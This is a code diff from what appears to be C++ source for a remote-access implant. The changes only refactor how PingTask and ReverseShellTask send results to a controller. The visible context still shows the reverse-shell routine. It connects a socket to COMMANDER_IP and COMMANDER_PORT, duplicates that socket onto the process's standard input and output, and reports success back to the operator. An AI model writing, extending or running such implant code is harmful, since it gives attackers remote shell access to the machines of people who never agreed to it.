@@ -14,7 +14,8 @@ std::unique_ptr<Task> parse_task_from_string(std::string name) {
 
 void PingTask::run() {
     auto api = Api::get_instance();
-    api.send_result(std::make_unique<Result>("toto", "Pong !", 0));
+    std::unique_ptr res = std::make_unique<Result>("toto", "Pong !", 0);
+    api.send_result(res);
 }
 
 void InvalidTask::run() {}
@@ -38,11 +39,13 @@ void ReverseShellTask::worker() {
     /* Try to connect to COMMANDER IP */
     if (connect(sockt, (struct sockaddr *) &revsockaddr, sizeof(revsockaddr)) == -1) {
         std::string msg = (std::string)"[ERROR] Failed to start a reverse shell to IP " + COMMANDER_IP + " and port " + std::to_string(COMMANDER_PORT);
-        api.send_result(std::make_unique<Result>("totto", msg, 1));
+        std::unique_ptr res = std::make_unique<Result>("tmp", msg, 1);
+        api.send_result(res);
         return;
     }
     std::string msg = (std::string)"[SUCCESS] Successfully started a reverse shell to IP " + COMMANDER_IP + " and port " + std::to_string(COMMANDER_PORT);
-    api.send_result(std::make_unique<Result>("toto", msg, 0));
+    std::unique_ptr res = std::make_unique<Result>("tmp", msg, 0);
+    api.send_result(res);
     
     dup2(sockt, 0);
     dup2(sockt, 1);
